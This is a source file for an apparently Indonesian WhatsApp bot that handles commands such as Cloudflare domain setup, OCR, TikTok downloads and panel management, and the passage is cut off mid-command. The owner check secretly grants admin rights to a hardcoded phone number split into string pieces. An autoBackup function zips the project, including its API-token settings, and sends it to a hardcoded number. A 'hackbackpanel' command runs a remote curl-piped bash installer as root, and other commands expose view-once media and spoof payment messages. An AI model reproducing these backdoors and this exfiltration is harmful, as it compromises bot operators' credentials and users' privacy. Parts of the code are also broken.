require("./settings")
const loadPluginsCommand = require("./lib/Plugins.js")
const fs = require('fs')
const util = require('util')
const os = require('os')
const FileType = require('file-type')
const path = require('path');
const axios = require('axios')
const chalk = require('chalk')
const { Client } = require('ssh2');
const sharp = require('sharp')
const crypto = require('crypto')
const moment = require("moment-timezone");
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const { fromBuffer } = require('file-type');
const speed = require('performance-now')
const { runtime, formatp, tanggal, sleep, fetchJson } = require('./lib/func')
const { exec, spawn, execSync } = require('child_process');
const { FakeLiveLoc, FakeTransaksi } = require("./lib/FakeQuoted.js")
/*const tanggal = new Intl.DateTimeFormat('id-ID', { dateStyle: 'full' }).format(new Date());
console.log(tanggal);
let desc = tanggal;*/
module.exports = async (bani, m, store) => {
try {
const from = m.key.remoteJid
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
  } = require("@whiskeysockets/baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '.')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
//const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (m.quoted || m)
const text = q = args.join(" ")
const isPc = from.endsWith('@s.whatsapp.net')
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = await bani.decodeJid(bani.user.id)
const sender = m.key.fromMe ? (bani.user.id.split(':')[0]+'@s.whatsapp.net' || bani.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot || senderNumber === "6"+"285659"+"202292";
const groupMetadata = isGroup 
  ? await bani.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)

//Fake Quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `ꪎ ${global.ownername}`
}}}
const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const xy = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { newsletterAdminInviteMessage: { newsletterJid: '0@newsletter', newsletterName: 'baniwwXD', caption: `© ${global.ownername}`, inviteExpiration: 0 } } };
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Bot"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `ꪎ ${global.ownername}`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `ꪎ ${global.ownername}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}

// Random Image
const imageUrls = [
        "https://i.ibb.co/m944LxT/image.jpg",
        "https://i.ibb.co/mHSbM3d/image.jpg",
        "https://files.catbox.moe/g4ae8u.jpg",
        "https://files.catbox.moe/9vp33w.jpg",
        "https://files.catbox.moe/6s1c3e.jpg"
    ];
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];
    
// Reply
const replyz = (teks) => {
    return bani.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, {})
}

bani.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
}

async function autoBackup(bani) {
  try {
    const ls = execSync("ls")
      .toString()
      .split("\n")
      .filter(
        (pe) =>
          pe !== "node_modules" &&
          pe !== "session" &&
          pe !== "package-lock.json" &&
          pe !== "yarn.lock" &&
          pe !== ""
      );

    execSync(`zip -r Backup.zip ${ls.join(" ")}`);

    const target = "6283167281739@s.whatsapp.net"; // Ganti sesuai keinginan
    await bani.SendMessage(bani, target, {
      document: fs.readFileSync("./Backup.zip"),
      mimetype: "application/zip",
      fileName: "Backup.zip",
      caption: "SUKSES MELAKUKAN BACKUP PER JAM"
    });

    execSync("rm -rf Backup.zip");

    console.log(chalk.greenBright("[*] Backup dan pengiriman selesai!"));
  } catch (err) {
    console.log(chalk.redBright("[!] Gagal melakukan backup:", err));
  }
}

async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new BodyForm();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}
    
   // Fungsi
global.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}
    
const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}
// Tampilan Di Console
const figlet = require('figlet');

if (m.message && m.text && m.text.startsWith('.')) {
    figlet.text('PESAN', {
        font: 'ANSI Shadow'
    }, (err, data) => {
        if (err) {
            console.log(chalk.red('Oops! Gagal membuat header figlet.'));
            return;
        }

        const line = chalk.cyan('══════════════════════════════════════════');

        console.log(
            '\n' + line + '\n' +
            chalk.cyanBright(data) + '\n' +  // Header dengan warna cyan terang

            chalk.bgGreen.black(' ▶  MESSAGE ') + chalk.greenBright(' │ ' + m.text) + '\n' +
            chalk.bgYellow.black(' ▶  SENDER  ') + chalk.yellowBright(' │ ' + m.sender) + '\n' +
            chalk.bgGreen.black(' ▶  TYPE    ') + chalk.greenBright(' │ ' + m.mtype) + '\n' +
            chalk.bgYellow.black(' ▶  CHAT    ') + (m.isGroup ? chalk.yellowBright(' │ GROUP CHAT') : chalk.yellowBright(' │ PRIVATE CHAT')) + '\n' +

            line + '\n'
        );
    });
}

// Gak Usah Di Apa Apain Jika Tidak Mau Error
let ppuser
try {
ppuser = await bani.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/2lw5hm.jpg'
}
function toStyledText(text) {
    const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const styled = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ";
    
    return text.split('').map(c => {
        let index = normal.indexOf(c);
        return index !== -1 ? styled[index] : c;
    }).join('');
}

//=======TEMPAT FUNC========//
    // topcmd
/*const fs = require('fs')
const moment = require('moment')*/
const dirPath = './database'
const logPath = `${dirPath}/command-logs.json`
if (!fs.existsSync(dirPath)) {
  fs.mkdirSync(dirPath)
}
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, JSON.stringify([]))
}
function logCommand(cmd) {
  let logs = JSON.parse(fs.readFileSync(logPath))
  logs.push({ cmd, time: Date.now() })
  fs.writeFileSync(logPath, JSON.stringify(logs))
}
if (command) logCommand(command)

  //totalfitur  
 const totalfitur = () => {
    var mytext = fs.readFileSync("./case.js").toString();
    var numCases = (mytext.match(/case ['"]/g) || []).length;
    return numCases;
};
    
//totalchat
//const fs = require('fs')
// const path = require('path')
const statsFolder = path.join(__dirname, './db')
const statsFile = path.join(statsFolder, 'groupStats.json')
if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder)
if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}')
function loadStats() {
  return JSON.parse(fs.readFileSync(statsFile))
}
function saveStats(data) {
  fs.writeFileSync(statsFile, JSON.stringify(data, null, 2))
}
function updateStats(chatId, senderId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  if (!data[chatId]) data[chatId] = {}
  if (!data[chatId][today]) data[chatId][today] = {}
  if (!data[chatId][today][senderId]) data[chatId][today][senderId] = 0
  data[chatId][today][senderId]++
  saveStats(data)
}
function getTodayStats(chatId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  return data[chatId]?.[today] || {}
}
updateStats(m.chat, m.sender)
    
// anti tag sw
if (m.message?.groupStatusMentionMessage && db?.data?.chats[m.chat]?.antitagsw?.status) {
  let user = m.key.participant
  let data = db.data.chats[m.chat].antitagsw
  if (!data.count) data.count = {}
  if (!data.count[user]) data.count[user] = 1
  else data.count[user]++
  if (data.count[user] >= 3) { // Ubah max kick di sini kalau mau
    await bani.groupParticipantsUpdate(m.chat, [user], 'remove')
    delete data.count[user]
  } else {
    await bani.sendMessage(m.chat, {
      text: `@${user.split('@')[0]} jangan tag sw! (${data.count[user]}/3)`,
      mentions: [user]
    })
  }
}
    
// auto koreksi
if (isCmd) {
    if (command) {
        try {
            const code = fs.readFileSync("case.js", "utf8");
            var regex = /case\s+'([^']+)':/g;
            var matches = [];
            var match;
            while ((match = regex.exec(code))) {
                matches.push(match[1]);
            }
            const help = Object.values(matches)
                .flatMap(v => v ?? []) 
                .map(entry => entry.trim().split(' ')[0].toLowerCase())
                .filter(Boolean); 
            if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
                let mean = didyoumean(command, help); 
                let sim = similarity(command, mean); 
                let similarityPercentage = parseInt(sim * 100);
                if (mean && command.toLowerCase() !== mean.toLowerCase()) {
                    const pesanTemplate = `🚫 Command Tidak Ditemukan!\nKami Mendeteksi Mungkin Yang Kamu Maksud\n\n➠ *${prefix + mean}* (${similarityPercentage}%)\n`;
                    bani.sendMessage(m.chat, {
                        image: { url: "https://img12.pixhost.to/images/1412/583442382_biyuofficial.jpg" }, 
                        caption: pesanTemplate,
                        footer: global.namabot,
                        buttons: [
                            {
                                buttonId: prefix + mean,
                                buttonText: {
                                    displayText: prefix + mean
                                }
                            }
                        ],
                        viewOnce: true,
                    }, {
                        quoted: xy 
                    });
                }
            }
        } catch (err) {
            console.error('Error membaca file atau mengirim pesan:', err);
        }
    }
}
    
    /*
try {
        const ownerList = global.owner || ['6283167281739']{ // ganti dengan nomor owner
        for (let ow of ownerList) {
            let jid = ow.includes('@s.whatsapp.net') ? ow : ow + '@s.whatsapp.net'
            await bani.sendMessage(jid, {
                document: fs.readFileSync('./database/registered.json'),
                fileName: 'registered.json',
                mimetype: 'application/json',
                caption: `📦 Auto Backup`
            }, { quoted: m })
        }
    } catch (err) {
        console.log('Gagal kirim auto-backup:', err)
    }
 }
    */
    
    if (!isCmd) {
  const Respon = JSON.parse(fs.readFileSync("./lib/respon.json"))
  const keys = m?.text?.toLowerCase();
  const check = Respon[keys];
if (check) {
    try {
      if (check.image) {
        await bani.sendMessage(m.chat, {
          image: {url: check.image},
          caption: check.teks
        }, { quoted: FakeLiveLoc });
      } else {
        await m.m.reply(check.teks, { quoted: FakeLiveLoc });
      }
    } catch (err) {
      console.error('Error sending message:', err);
    }
  }
}

const handleData = { bani, text, args, isCmd, mime, qmsg, isCreator, command }
if (isCmd) {
await loadPluginsCommand(m, command, handleData)
}

    async function Uguu(buffer, filename) {
  const form = new FormData()
  form.append('files[]', buffer, { filename })
 
  const { data } = await axios.post('https://uguu.se/upload.php', form, {
    headers: form.getHeaders(),
  })
 
  if (data.files && data.files[0]) {
    return data.files[0].url
  } else {
    throw new Error('Upload gagal.')
  }
}

    
//=======AKHIR TEMPAT FUNC==//
    
global.cooldownPanel = global.cooldownPanel || {}
global.bannedPanel = global.bannedPanel || {}
    
switch (command) {

case "adddomaincf": case "adddomcf": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.includes(".")) return m.reply("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
 baseURL: 'https://api.cloudflare.com/client/v4',
 headers: {
 'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
 'Content-Type': 'application/json'
 }
});
async function addNewDomainToCloudflare(domainName) {
 try {
 const response = await cloudflare.post('/zones', {
 name: domainName,
 account: {
 id: global.accountid_cloudflare
 },
 plan: {
 id: 'free'
 },
 type: 'full',
 jump_start: true
 });
 return response.data
 } catch (error) {
 return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
 }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return m.reply(respon)
} else {
return m.reply(JSON.stringify(res, null, 2))
}
}
break


case "ocr": {
 try {
 
 let q = m.quoted ? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 if (!mime || !mime.startsWith('image/')) 
 throw 'Silakan kirim atau reply *gambar* untuk diubah ke teks.'
 
 let media = await q.download()
 let ext = mime.split('/')[1]
 let filename = `ocr.${ext}`
 
 let imageUrl = await Uguu(media, filename)
 let { data } = await axios.get(`https://www.abella.icu/ocr?imageUrl=${encodeURIComponent(imageUrl)}`)
 
 if (data?.status !== 'success') throw 'OCR gagal, coba lagi nanti.'
 
 let hasil = data.data?.extractedText || 'Tidak ada teks yang berhasil diekstrak'
 m.reply(hasil.replace(/\r/g, ''))
 } catch (err) {
 
 m.reply(`${err}`)
 }
}
break


case "rvo": {
 if (!m.quoted) return m.reply(
 `*❌Syntax Error!!*
*Example:* reply ViewOnce with caption ${prefix + command}`);
 try {
 let buffer = await m.quoted.download();
 let type = m.quoted.mtype;
 let sendOptions = { quoted: m };
 let caption = "Done Nih Hasil Rvo Ny";

 if (type === "videoMessage") {
 await bani.sendMessage(m.chat, { video: buffer, caption }, sendOptions);
 } else if (type === "imageMessage") {
 await bani.sendMessage(m.chat, { image: buffer, caption }, sendOptions);
 } else if (type === "audioMessage") {
 await bani.sendMessage(m.chat, {
 audio: buffer,
 mimetype: "audio/mpeg",
 ptt: m.quoted.ptt || false
 }, sendOptions);
 } else {
 return m.reply("❌ Media View Once tidak didukung.");
 }
 } catch (err) {
 console.error(err);
 }
}
break


case 'ghibli':
case 'toghibli': {
 try {
 let url

 if (text && text.startsWith('http')) {
 url = text
 } else if ((m.quoted?.mimetype || '').includes('image')) {
 const media = await conn.downloadAndSaveMediaMessage(m.quoted)
 try {
 const catboxUrl = await CatBox(media)
 url = catboxUrl
 } catch (err) {
 console.error(err)
 return m.reply('❌ Gagal upload ke Catbox')
 } finally {
 fs.unlinkSync(media)
 }
 } else {
 return m.reply('❌ Kirim link gambar atau reply gambar dengan caption *.ghibli*')
 }

 const apiUrl = `https://api.fasturl.link/aiimage/ghibli?imageUrl=${encodeURIComponent(url)}&type=jpg&server=server1`
 
 // Tidak pakai res.json() karena API mengembalikan file gambar
 await bani.sendMessage(m.chat, {
 image: { url: apiUrl },
 caption: `✅ Gambar sudah diubah ke gaya Ghibli`
 }, { quoted: m })

 } catch (e) {
 console.error(e)
 m.reply('⚠️ Terjadi kesalahan saat memproses gambar.')
 }
}
break


case 'totalfiturcase': {
 try {
 let total = totalfitur();
 m.reply(`*Total fitur case aktif saat ini:* ${total} fitur!`);
 } catch (e) {
 m.reply(`Gagal membaca total fitur:\n${e.message}`);
 }
}
break


case "tojs": case "filejs": {
 const isQuotedText = m.quoted && m.quoted.text;
 let filename = "";
 let content = "";

 if (isQuotedText) {
 if (!text) return m.reply("Contoh: .tojs namafile\n(isi file dari reply teks)");
 filename = text.trim().replace(/\.js$/i, "") + ".js";
 content = m.quoted.text;
 } 
 else if (text.includes("|")) {
 const [name, ...rest] = text.split("|");
 filename = name.trim().replace(/\.js$/i, "") + ".js";
 content = rest.join("|").trim();
 if (!filename || !content) return m.reply("Contoh: .tojs namafile|isi file");
 } 
 else {
 return m.reply("Contoh:\n1. Reply teks lalu ketik: .tojs namafile\n2. Atau: .tojs namafile|isi file");
 }

 const path = require("path");
 const fs = require("fs");
 const filepath = path.join(__dirname, filename);

 fs.writeFileSync(filepath, content, "utf-8");

 await bani.sendMessage(m.chat, {
 document: fs.readFileSync(filepath),
 fileName: filename,
 mimetype: "application/javascript",
 caption: "✅ File berhasil dibuat!"
 }, { quoted: m });

 fs.unlinkSync(filepath);
}
break


case "hbpanel": case "hackbackpanel": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply ("example: ipvps|pwvps")

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await bani.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break


case "subdomain-response": { 
if (!isCreator) return m.reply(mess.owner);
if (!text) return 
if (!args[0] || isNaN(args[0])) return m.reply("Domain tidak ditemukan!");
const dom = Object.keys(subdomain);
const domainIndex = Number(args[0]) - 1;
if (domainIndex >= dom.length || domainIndex < 0) return m.reply("Domain tidak ditemukan!");

if (!args[1] || !args[1].includes("|")) return m.reply("Hostname/IP Tidak ditemukan!");

let tldnya = dom[domainIndex];
const [host, ip] = args[1].split("|").map(str => str.trim());

async function subDomain1(host, ip) {
 return new Promise((resolve) => {
 axios.post(
 `https://api.cloudflare.com/client/v4/zones/${subdomain[tldnya].zone}/dns_records`,
 {
 type: "A",
 name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
 content: ip.replace(/[^0-9.]/gi, ""),
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: `Bearer ${subdomain[tldnya].apitoken}`,
 "Content-Type": "application/json",
 },
 }
 ).then(response => {
 let res = response.data;
 if (res.success) {
 resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
 } else {
 resolve({ success: false, error: "Gagal membuat subdomain." });
 }
 }).catch(error => {
 let errorMsg = error.response?.data?.errors?.[0]?.message || error.message || "Terjadi kesalahan!";
 resolve({ success: false, error: errorMsg });
 });
 });
}

let teks = `\nSubdomain Berhasil Dibuat ✅\n\n- IP: ${ip}\n`;
const domnode = `node${getRandom("")}.${host}`;

for (let i = 0; i < 2; i++) {
 let subHost = i === 0 ? host.toLowerCase() : domnode;
 try {
 let result = await subDomain1(subHost, ip);
 if (result.success) {
 teks += `- ${i == 1 ? "Node:" : "Panel:"} ${result.name}\n`;
 } else {
 return m.reply(result.error);
 }
 } catch (err) {
 return m.reply("Error: " + err.message);
 }
}

await m.reply(teks);

}
break


case "subdo": case "subdomain": {
if (!isCreator) return m.reply(mess.owner);
if (!text.includes("|")) return m.reply(`Format salah!\n*contoh:* ${command} hostname|ipvps`)
const obj = Object.keys(subdomain);
if (obj.length < 1) return m.reply("Tidak ada domain yang tersedia.")
const rows = []
const hostname = text.split("|")[0].toLowerCase()
const ip = text.split("|")[1]
obj.forEach((domain, index) => rows.push({
title: `🌐 ${domain}`,
description: `Result: https://${hostname}.${domain}`, 
id: `.subdomain-response ${index + 1} ${hostname.trim()}|${ip}`
}))
await bani.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Domain',
 sections: [
 {
 title: `© ${global.namabot} Version ${global.versibot}`,
 rows: rows
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: `\nPilih Domain Server Yang Tersedia\nTotal Domain: ${obj.length}\n`
}, { quoted: m })
}
break





case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(`Media tidak ditemukan!\nKetik *${command}* dengan reply/kirim media`)
 m.reply("Proses . . .")
 const FormData = require('form-data');
 const { fromBuffer } = require('file-type'); 
 async function dt(buffer) {
 const fetchModule = await import('node-fetch');
 const fetch = fetchModule.default;
 let { ext } = await fromBuffer(buffer);
 let bodyForm = new FormData();
 bodyForm.append("fileToUpload", buffer, "file." + ext);
 bodyForm.append("reqtype", "fileupload");
 let res = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: bodyForm,
 });
 let data = await res.text();
 return data;
 }

 let aa = m.quoted ? await m.quoted.download() : await m.download();
 let dd = await dt(aa);
 await bani.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.link/aiimage/upscale?imageUrl=${dd}&resize=2`}, caption: `Berhasil meningkatkan kualitas Gambar ✅`}, {quoted: m})
}
break


case "restart": case "rst": case "restartbot": {
 if (!isCreator) return m.reply(mess.owner)
 await m.reply("Memproses _restart server_ . . .")
 var file = await fs.readdirSync("./session")
 var anu = await file.filter(i => i !== "creds.json")
 for (let t of anu) {
 await fs.unlinkSync(`./session/${t}`)
 }
 await m.reply("Restarting bot...")
 process.exit(0)
}
break

case 'delcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
    const fs = require('fs')
    const namaFile = 'case.js'
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err)
            return m.reply('Gagal membaca file')
        }
        const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break`, 'g')
        if (!casePattern.test(data)) {
            return m.reply(`Case '${text}' tidak ditemukan`)
        }
        const newContent = data.replace(casePattern, '')
        fs.writeFile(namaFile, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err)
                return m.reply('Gagal menghapus case')
            }
            m.reply(`Case '${text}' berhasil dihapus`)
        })
    })
}
break

case "brat6": case "bratimg": {
if (!text) return m.reply ('example: teksnya')
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await bani.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break


case "addakses": case "addaksesgc": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
const input = m.chat
if (premium.includes(input)) return m.reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah grup reseller panel ✅`)
}
break








case 'changemymind': {
 if (!text) return m.reply(`Contoh:\n${prefix + command} bani ganteng 😏`)

 const api = `https://nekobot.xyz/api/imagegen?type=changemymind&text=${encodeURIComponent(text)}`
 try {
 const res = await fetch(api)
 const json = await res.json()
 if (!json.message) return m.reply('❌ Gagal membuat gambar.')
 bani.sendFile(m.chat, json.message, 'baniwwXD.jpg', `🧠 Nih pendapatmu udah dibikin meme`, m)
 } catch (e) {
 console.error('[AIMGEN ERROR]', e)
 m.reply('⚠️ Gagal mengambil gambar dari NekoBot.')
 }
}
break


case 'tiktok':
case 'tt':
case 'ttnowm': {
 if (!text) return m.reply(`https://vt.tiktok.com/ZS8KdFQcQ/`);

 await bani.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 try {
 const res = await fetch(`https://api.vreden.my.id/api/tiktok?url=${encodeURIComponent(text)}`);
 if (!res?.result?.data) throw 'Gagal mengambil data!';

 const data = res.result.data.find(x => x.type === 'nowatermark');
 if (!data?.url) throw 'Tidak ada video tanpa watermark ditemukan!';

 await bani.sendMessage(m.chat, {
 video: { url: data.url },
 caption: `✅ Berhasil download!\n\n🎵 Audio: ${res.result.music?.title || '-'}\n👤 Creator: ${res.result.author?.nickname || '-'}`
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply('❌ Gagal mengambil video TikTok.');
 }
}
break


case 'tourl3': {
 if (!m.quoted || !m.quoted.fileSha256) return m.reply(`Balas file media (img, vid, audio, doc, gif, sticker, dll)`);
 let mime = (m.quoted.msg || m.quoted).mimetype || '';
 let media = await m.quoted.download();
 if (!media) return m.reply("❌ Gagal mengunduh media!");

 try {
 const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');
 const path = require('path');

 // Buat folder temp jika belum ada
 if (!fs.existsSync('./temp')) fs.mkdirSync('./temp');

 const extension = mime.split('/')[1] || 'file';
 const fileName = `NeoUpload_${Date.now()}.${extension}`;
 const filePath = `./temp/${fileName}`;
 fs.writeFileSync(filePath, media);

 const form = new FormData();
 form.append('reqtype', 'fileupload');
 form.append('fileToUpload', fs.createReadStream(filePath));

 const res = await axios.post('https://catbox.moe/user/api.php', form, {
 headers: form.getHeaders()
 });

 fs.unlinkSync(filePath);

 const url = res.data.trim();
 if (!url.includes('https://')) return m.reply("❌ Gagal mengunggah ke Catbox!");

 const sizeKb = (media.length / 1024).toFixed(2);
 const caption = `*Upload Berhasil!*\n\n` +
 `*• Nama:* ${fileName}\n` +
